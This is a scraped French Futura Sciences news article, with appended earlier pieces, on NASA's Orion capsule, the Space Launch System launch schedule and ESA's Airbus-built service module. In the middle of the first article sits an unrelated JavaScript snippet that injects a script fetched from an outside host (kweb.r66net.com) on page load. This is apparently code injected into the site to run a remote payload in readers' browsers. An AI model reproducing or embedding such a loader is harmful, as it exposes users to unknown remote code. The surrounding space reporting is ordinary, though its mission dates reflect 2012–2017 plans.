{"title": "Le vaisseau spatial Orion enverra des Hommes dans l'espace en 2023", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-05-16", "content": "La Nasa a de nouveau communique a propos de son futur lanceur lourd, le  Space Launch System . La premiere mission de celui-ci est toujours prevue en decembre 2019, avec le vaisseau spatial Orion. Elle sera inhabitee. Il faudra attendre la suivante, prevue en juin 2022 mais qui aura plus vraisemblablement lieu en 2023, pour voir des astronautes y prendre place. Malgre des retards accumules et des dommages causes par une  tornade  a l'usine Michoud, de la Nasa, ou sont assembles des elements d' Orion  et du  Space Launch System  (SLS), le calendrier des premiers vols n'a guere evolue par rapport a celui de mai 2017 (voir article ci-dessous). Les responsables de la mission sont toujours convaincus que ce premier tir aura lieu en decembre 2019, malgre les conclusions d'une etude interne qui indiquent que ce  lanceur  ne decollera pas avant mi-2020. Provisoirement baptisee  Exploration Mission-1  (EM-1), cette premiere mission avec le  vehicule Orion  sera inhabitee, bien que la presence d' astronautes  ait ete envisagee lors de ce premier vol. Il s'agira d'un vol circumlunaire, avec retour sur  Terre , au cours duquel le vehicule parcourra plus de 64.000 km au-dela de la  Lune . L'objectif de cette mission consiste a valider les performances de ce  futur lanceur lourd  mais aussi celles de la capsule et de son  module de service  (construit par Airbus Defence and Space) avant son utilisation pour le vol habite. La mission EM-1 resumee en moins de neuf minutes, du roulage du  Space Launch System  a la recuperation de la capsule Orion. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais apparaissent alors. Cliquez ensuite sur la roue dentee a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c) Nasa Des astronautes des le deuxieme vol La premiere mission habitee sera realisee lors du deuxieme vol du SLS.  Exploration Mission-2  (EM-2) est prevue en juin 2022, mais avec un possible decalage en 2023. A l'origine, ce vol devait etre inhabite et avait notamment pour objectif de tester en conditions reelles la  tour de sauvetage  de la capsule Orion. Pour des raisons pratiques et financieres, EM-2 sera une mission habitee cislunaire de huit jours avec deux astronautes a bord. Quant au systeme d'evacuation d'urgence de la capsule, il sera bien evidemment teste avant ce vol, en avril 2019, avec le lancement d'une capsule Orion et de sa tour de sauvetage installee sur le premier etage d'un ancien missile Peacekeeper.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Concernant  Exploration Mission-3 , le scenario de reference se precise. Parmi les schemas de mission envisages, la Nasa a fait le choix d'une mission en  orbite  NRHO autour de la Lune ( Near-Rectilinear Halo Orbit ) afin de deployer le premier module d'habitation de l' avant-poste lunaire . Comme nous l'expliquait en septembre dernier Frank De Winne, ancien astronaute de l'Agence spatiale europeenne ( ESA ) et directeur du Centre europeen des astronautes (EAC), cette passerelle vers l'espace profond ( Deep Space Gateway , en anglais) devrait etre le grand programme qui succedera a la  Station spatiale internationale  (ISS). Pour en savoir plus Quand le vaisseau spatial Orion enverra-t-il des Hommes dans l'espace ? Article de  Remy Decourt  publie le 16/05/2017 La Nasa veut envoyer des Hommes dans l'espace grace a la capsule Orion. Elle avait un temps envisage de le faire des la premiere mission de ce vaisseau spatial (prevue en 2018 puis decalee a 2019), mais ce ne sera finalement pas possible. Les premiers astronautes partiraient donc plus tard, en 2021. Lors d'une conference de presse qui a eu lieu samedi 13 mai, Robert Lightfoot, l'administrateur interimaire de la Nasa, a annonce que le premier vol de la capsule Orion (lancee par le  Space Launch System ) serait finalement inhabite. Un temps envisagee, l'idee de faire voler des astronautes des ce premier vol a donc ete abandonnee. La raison de ce changement est financiere. En effet, decidee le 24 fevrier, l'etude de faisabilite d'embarquement des astronautes des la premiere mission avait revele qu'il y avait moins de difficultes techniques que prevu. <<  Cela a ete une bonne surprise  >>, souligne Bill Gerstenmaier, responsable adjoint de la Nasa pour les vols habites. Cela dit, embarquer un equipage lors de cette premiere mission aurait coute a la Nasa de 600 a 900 millions de dollars supplementaires et induit un report de ce premier lancement au premier ou au deuxieme trimestre 2020. Un vol inaugural inhabite et decale a 2019 La Nasa s'en tiendra donc a son programme initial. Celui-ci prevoit d'embarquer un equipage pour le deuxieme vol d'essai d'Orion, a  destination de la Lune , prevu en aout 2021. Toutefois, on s'attend a ce que la Nasa decide d'un report de plusieurs mois pour ce deuxieme vol. Par ailleurs, si le premier vol etait initialement prevu en 2018, il a ete decale a 2019. Cela moins en raison des difficultes techniques que des aleas propres a chaque nouveau programme de cette complicite (retard, depassement de couts). Sont en cause notamment, le retard de livraison du  module de service d'Orion  (fourni par l'ESA et construit par Airbus) et la decouverte de defauts de fabrication d'un des reservoirs du  Space Launch System . En fevrier, une tornade a aussi provoque de tres lourds degats dans l'usine de Michoud de la Nasa, en Louisiane, ou sont fabriques des elements du lanceur.  Le vaisseau spatial Orion pourrait envoyer des Hommes dans l'espace des 2018 Article de Remy Decourt publie le 1 er  mars 2017 La Nasa envisage d'envoyer des astronautes dans la capsule Orion des la premiere mission d'essai de ce vaisseau spatial, en 2018. Ce qui va soulever quelques problemes. Alors que le 10 fevrier, nous annoncions que le vaisseau spatial Orion pourrait envoyer des Hommes dans l'espace en 2021 (voir ci-dessous), la Nasa reflechit a avancer cette date a 2018, en lieu et place du vol d'essai inhabite prevu, Exploration Mission 1 ou EM-1. Le 15 fevrier, Robert Lightfoot, l'administrateur par interim de la Nasa, a demande a Bill Gerstenmaier, administrateur associe pour l'exploration humaine a la Nasa, de commencer une etude sur la faisabilite d'envoyer un equipage lors de la premiere mission d'Orion. Aussi excitante soit-elle, l'idee d'embarquer un equipage, vraisemblablement de deux astronautes, a bord d'Orion des son premier vol souleve plusieurs questions. Sans surprise, le vehicule ne sera pas tout a fait le meme que la version qui devait etre utilisee pour le vol inhabite. La Nasa va devoir apporter un certain nombre de modifications, pour se conformer a ses propres regles de securite liees aux vols habites. Sont notamment concernes les servitudes du vehicule et le systeme de support vie. Le  lanceur SLS  ( Space Launch System ), dont ce sera aussi le premier vol, doit s'adapter a ce nouveau scenario. En effet, l'etage superieur qui devait etre utilise pour le vol initial de 2018 n'est pas qualifie pour le vol habite. Dans le planning actuel, cette version EUS ( Exploration Upper Stage ) ne doit etre livree qu'en 2021. Son developpement devra donc etre accelere. Dans sa version de base, le  Space Launch System , avec ses deux etages, aura une capacite de lancement de 70 tonnes en orbite basse. Avec l'utilisation d'un troisieme etage, necessaire pour le vehicule Orion pour des missions au-dela de l'orbite terrestre (l'etage EUS pour  Exploration Upper Stage ), cette capacite sera portee a 105 tonnes, et a 143 tonnes avec l'utilisation de boosters plus puissants. (c) Nasa                                Le budget spatial de Trump tres attendu Autre sujet de reflexion, alors que le vol de demonstration inhabite de 2018 devait pousser le vehicule Orion et son lanceur dans certaines de leurs limites, ce ne pourra etre le cas avec un equipage a bord. Pour ce vol, le  lanceur SLS  realisera lui aussi son premier vol, bien que chacun de ses etages et  propulseurs  aura ete teste au sol. Lors de cette premiere mission habitee, le vehicule ira moins loin, volera moins longtemps et realisera une mission plus conservatrice pour tester les performances du systeme de support de vie que ce qui etait prevu. Cela dit, s'il ne fait guere de doute que techniquement la Nasa sera capable de lancer des astronautes des le premier vol d'Orion, plutot en 2019 qu'en 2018, seule la proposition de budget pour l'annee 2018, deposee en avril, confirmera ou non ce changement d'orientation du programme des vols habites de la Nasa. Enfin, a la demande du Senat, la Nasa doit rendre publique d'ici quelques semaines une etude sur la  compatibilite  technique d'Orion pour des navettes d'equipages vers la  Station spatiale internationale . La capsule Orion de la Nasa enverra-t-elle des astronautes en 2021 ? Article de Remy Decourt publie le 10 fevrier 2017 En 2021, un vaisseau Orion, de la Nasa, emmenera des astronautes americains hors de l'orbite terrestre. Ce sera la premiere fois depuis 1972, quand  Apollo  17 est revenu de la Lune. Son module de service, avec le moteur et le carburant, sera europeen. Derive de l' ATV , il sera fourni par l'ESA et construit par Airbus Defence and Space. Lors du Salon du Bourget de juin 2011, Jean-Jacques Dordain, alors directeur general de l'ESA, expliquait vouloir capitaliser sur le  programme de vehicule automatique ATV  en developpant un module qui pourrait devenir un element du futur vehicule spatial habite de la Nasa, Orion. En novembre 2012, l'Agence spatiale europeenne (ESA) decidait de participer a son developpement en fournissant le  module de service  de cet engin, qui enverra des astronautes autour de la Lune a l'horizon 2020 puis vers un  asteroide  et plus tard Mars. Solidaire de la capsule habitee, ce module  porte  le moteur et des panneaux solaires. Durant le vol spatial, il fournit la poussee et l' energie , et embarque aussi les reserves de carburant, d'eau et d' oxygene  (voir plus bas l'entretien que nous avait accorde Philippe Deloo, de l'ESA). Ce module de service europeen, d'environ 3,5 t, sera utilise pour la premiere fois en 2018 lors de l' Exploration Mission-1 , premier vol du  vehicule spatial Orion  inhabite. Le vaisseau ira faire le tour de la Lune et reviendra sur Terre. L'objectif de cette mission sera de valider a la fois les performances de la capsule avant son utilisation pour le vol habite et celles du nouveau lanceur  Space Launch System  (SLS) de la Nasa.  Le premier module de service europeen du vehicule spatial Orion. Il est ici vu dans le batiment d'integration d'Airbus Defence and Space a Breme (Allemagne). (c) Airbus DS                               Orion emmenera quatre astronautes Le 16 fevrier prochain, l'ESA signera avec Airbus Defence and Space le contrat de la construction du deuxieme module de service europeen en vue de la mission suivante, habitee cette fois, prevu en 2021. Le vehicule spatial Orion emportera quatre astronautes americains pour une  mission circumlunaire  de plusieurs jours, dont la  duree  et le profil de vol ne sont pas completement decides. Plusieurs scenarios sont a l'etude. La duree de la mission pourrait etre etendue de 8 a 21 jours et plusieurs options de  survols  lunaires sont envisagees dont une, notamment, au  point de Lagrange  2, a une distance de 61.548 km de la Lune. Seule certitude, pour  minimiser les risques  en cas de panne de son systeme de propulsion, Orion evoluera sur une trajectoire de retour libre qui lui permettra de revenir sur Terre meme moteur eteint. Le vehicule spatial Orion prend forme. A l'image, la structure sous-jacente du module d'equipage dans le  Neil Armstrong Operations and Checkout  du Centre spatial Kennedy. (c) Nasa                               Un Europeen embarquera-t-il a bord d'Orion ? Ce sera la premiere fois depuis 1972 que des Hommes quitteront l'orbite terrestre et egalement la premiere fois depuis le  retrait de la navette spatiale  en juillet 2011 que des astronautes americains utiliseront un vehicule de leur pays pour voyager dans l'espace. Et ce sont des equipements europeens qui assureront la propulsion, l'alimentation electrique, l'approvisionnement en eau et le controle thermique. Lors de ce vol historique, aucun astronaute europeen ne sera a bord du vehicule. Mais la realisation du module de service pour des missions habitees represente tout de meme un gage de confiance et de reconnaissance des competences de l'ESA de la part de la Nasa. Lors de la suite du programme, plus precisement pour le vol numero 4, voire des le troisieme, l'ESA compte bien embarquer un de ses astronautes a bord d'Orion pour une  mission d'exploration  de la Nasa. Le saviez-vous ? L'ESA financera a hauteur de 450 millions d'euros le developpement du module de service du futur vehicule d'exploration spatiale de la Nasa. Cette somme correspond a la contrepartie du loyer dont l'ESA doit s'acquitter aupres de la Nasa pour la periode 2017-2020. Cela se fait dans le cadre du  barter element , un systeme mis en place par les partenaires de l'ISS ou chacun finance sa part de l'utilisation de l'ISS par la fourniture d'un service du meme montant que sa contribution. Jusqu'en 2017, l'ESA s'est acquittee de ses charges avec les cinq missions de l'ATV.  Exclusif : le module de service du vaisseau spatial Orion se devoile Article de Remy Decourt publie le 18/12/2012 L'Agence spatiale europeenne et la Nasa se sont mises d'accord pour la fourniture par l'Europe du module de service d'Orion, le futur vehicule d'exploration de la Nasa. Philippe Deloo, chef d'etude du module de service du MPCV, nous explique les grandes lignes de ce programme. Reunis en session extraordinaire a Naples, les ministres en charge des questions spatiales des Etats membres de l'Agence spatiale europeenne ( ESA ) ont decide de participer au developpement du vehicule spatial d'exploration de la Nasa connu sous le nom d' Orion-ESM  (auparavant nomme  Multi-Purpose Crew Vehicle , soit Vehicule habite multirole). L'ESA fournira le module de service de l'engin ( ESM, European service module ). Cette decision donne a l'Europe l'opportunite d'utiliser au mieux les capacites developpees pour l'ATV et  Columbus  et de rentabiliser ses technologies. Quant a la Nasa, elle pourra raccourcir de facon significative le calendrier de developpement de cet engin, dont le premier vol d'essai inhabite est prevu en 2017, et abaisser son cout. Pour y voir plus clair sur ce programme, nous avons interroge Philippe Deloo, chef d'etude du module de service d'Orion, a l'ESA.  Dans le cadre de l'accord signe entre la Nasa et l'ESA, l'Europe  << s'engage a fournir un premier modele de vol du module de service de l'Orion-ESM >>  avec une option pour un second module a echanger contre  << un service qui pourrait etre un vol d'astronautes, ou tout autre service que la Nasa et l'ESA identifieraient dans le futur comme interessant pour les deux organisations >> , detaille Philippe Deloo. Le module de service SSA ( Spacecraft Sub-Assembly ) de l'ATV, dont s'inspira l'ESA pour developper celui de l'Orion-MPCV. Ce module abrite notamment le systeme de propulsion compose de 4 moteurs principaux et de 28 moteurs de manoeuvre (dont 8 sont installes sur le module de charge utile ICC qui, lui, est pressurise). (c) ESA, S. Corvaja                               L'heritage de l'ATV pour Orion-MPCV S'inspirant de l'ATV ( Automated Transfer Vehicle ), construit par un consortium europeen sous la maitrise d'oeuvre d' Airbus DS , le module de service d'Orion se presente sous la forme d'un cylindre de 4,5 m de diametre et long de 2,7 m ou de 4 m avec le moteur. Si l'on tient compte de ses quatre panneaux solaires, son envergure atteint 18,7 m. A vide (sans carburant, sans eau et sans reserve de  gaz ), sa  masse  est d'environ 3,5 t. Ce module a pour fonction  << de propulser la capsule Orion, d'assurer son controle thermique et de lui fournir la puissance electrique necessaire a son bon fonctionnement, en plus de stocker les reserves d'eau, d'oxygene et d' azote  >> . Pour cela, il sera dote d'un tres gros moteur, fourni par la Nasa, qui n'est ni plus ni moins qu'un de ceux de la navette spatiale,  << qui a deja vole >>  ! Precisement, il s'agit  << d'un des deux moteurs du systeme  OMS  >> . Situe a l'arriere, au-dessus des moteurs SSME ( Space Shuttle Main Engines , moteurs principaux), ils etaient utilises pour les corrections de trajectoire et la desorbitation de la navette. Ce moteur  << developpe une poussee d'environ 26 kilonewtons (kN) >> . En plus de ce moteur, le module de service d'Orion pourra compter sur  << 8 moteurs redondants [ NDLR  : de secours] de 490 N de poussee, ce qui equivaut a 4 kN >> . C'est evidemment inferieur a la puissance fournie par le moteur principal, mais suffisant pour ramener sur Terre en securite la capsule Orion.  << Ils seront utilises en cas de panne du moteur principal comme systeme de secours en plus de leur utilisation pour des corrections de trajectoire. >> Le moteur principal du module de service d'Orion sera l'un des deux moteurs de l' Orbiting Maneuvering System  (signales par des traits rouges, en bas et sur l'image de detail) que les navettes utilisaient pour leurs manoeuvres orbitales. (c) Nasa                       Une vingtaine de moteurs de controle d'attitude Pour le  controle d'attitude , le module ESM utilisera  << 24 moteurs de 220 N de poussee avec une  resistance  a un certain nombre de pannes, dont la perte simultanee de plusieurs d'entre eux >> . Quant a l'electricite, elle sera produite par quatre panneaux solaires positionnes a 60deg degres en eventail, comme c'est le cas sur l'ATV. Ils seront un peu moins longs et plus larges mais fourniront une puissance plus grande. <<   Les cellules solaires seront a base d'arseniure de  gallium  dont le rendement est d'environ 30 %. Au total, la puissance electrique disponible pourra atteindre 11 kW. >>  C'est pratiquement deux fois superieur au rendement des panneaux solaires de l'ATV, dont les cellules en  silicium  offraient un taux de rendement de 17 % et fournissaient 4,5 a 5 kW de puissance electrique. Orion-MPCV, un module de service pour voyager partout Ce module de service sera  << utilisable pour tout type de mission au-dela de l'orbite terrestre et permettra de faire toutes les missions d'exploration envisagees par la Nasa >> , assure Philippe Deloo. En jouant sur la puissance du lanceur et l'adjonction en orbite d'autres modules, l'Orion-ESM pourra  << etendre son rayon d'action et son autonomie >>  vers un des cinq points de Lagrange, un asteroide ou les mondes de Mars. Actuellement, les plans de la Nasa prevoient un vol de test habite circumlunaire a l'horizon 2020, puis une visite d'un  asteroide  que la Nasa prevoit de capturer, une etape consideree comme intermediaire pour envisager le voyage martien. Parmi les autres projets, l'installation d'une base permanente ou non au  point de Lagrange L2  pour y etudier les  effets d'un sejour long  loin de la Terre ainsi que les risques lies a la  perte osseuse  et a l'exposition aux rayonnements. Quant a ses performances,  << elles ne sont pas du ressort de l'ESA >> . Avec une capacite de 8,6 t d' ergols  stockes, l'autonomie d'Orion-ESM dependra de la  vitesse  a laquelle ces reserves seront consommees et de la masse a transporter (fret et equipage). L'exigence au niveau systeme,  << c'est de pouvoir fournir un delta v ([?]v) de 1.600 m/s >> . Ce n'est pas suffisant pour quitter l'orbite terrestre (il faut passer de 8 a 11 km/s), mais  << assez pour quitter celle de la Lune et revenir sur Terre, en ralentissant la capsule avant l'entree atmospherique >> . Dans l'usine turinoise de Thales Alenia Space, une premiere section du futur ATV-5 avec, au fond a droite, la presse utilisee pour le construire (novembre 2010). C'est ici et a partir du meme procede que sera construite la structure du module de service de l'Orion MPCV de la Nasa. (c) R. Decourt                               Des delais de developpement tres courts pour Orion-MPCV Construit en Europe, il sera livre a la Nasa en l'etat. Il reviendra  << aux Americains de l'integrer a la capsule Orion >> . Le premier vol d'essai, inhabite, est prevu en decembre 2017, ce qui  << necessite une livraison debut 2017 >> . Autrement dit, les delais de developpement sont tres courts. Au vu de cette contrainte de temps, l'ESA est  << entree en discussion exclusive avec Airbus DS pour la maitrise d'oeuvre et Thales Alenia Space pour la fourniture de la structure >> . Si la  premiere reunion avec la Nasa  remonte a mai 2011, date officielle du debut du programme,  << ces trois prochaines annees ne seront pas de trop >>  pour realiser cet engin. Entre l'achat des materiaux et les tests a realiser,  << le challenge promet d'etre passionnant >> . << Nous ne partons pas de zero >> , rappelle Philippe Deloo. Avec l'ATV, l'ESA a un acquis qui  << ne necessite pas d'etude preliminaire >> . Ce module de service tiendra compte du  << retour d'experience de l' ATV  et ses trois vols reussis >> . L'idee est de  capitaliser sur le programme ATV  et d'utiliser le maximum de technologies existantes, << sur etageres >> dans le jargon spatial, pour  << essayer d'avoir un systeme plus performant >> . S'il n'y aura pas de rupture technologique, le principal point dur identifie est celui de la propulsion, auquel  << il faudra qu'on prete beaucoup d'attention >> . Des perspectives commerciales pour Orion-MPCV La Nasa, qui prevoit d'utiliser l'Orion-ESM pendant les 20 a 30 prochaines annees, aura besoin d'autant de modules de service. Bien qu'elle ait  << negocie avec l'Agence spatiale europeenne la possibilite de le reproduire >> , elle devra neanmoins aussi negocier avec les industriels europeens du programme pour certains elements qui relevent de la propriete industrielle. Autrement dit, la Nasa ne pourra pas reproduire entierement le module de service. Les elements les plus pointus  << resteront sous la maitrise d'oeuvre europeenne  >>. Si pour un certain nombre d'elements, il n'y a  << aucun probleme a fournir les plans et les details d'agencement >> , d'autres feront l'objet de negociations. Par exemple, ce sera le cas pour les moteurs de controle d'altitude, pour lesquels  << l'ESA ne fournira ni plans ni licences >> . La Nasa n'aura alors pas d'autre choix que de les acheter a l'industriel concerne. Orion : un nouveau vehicule spatial bientot en phase de test                       Orion est pret a etre lance. Le nouveau vehicule spatial lourd concu par l'Esa et la Nasa est arrive en phase de test. Il est destine aux voyages en direction de l'ISS, d'asteroides et peut-etre de Mars. Decouvrez en video une reconstitution du test etape par etape.                                       ", "theme": "sciences"}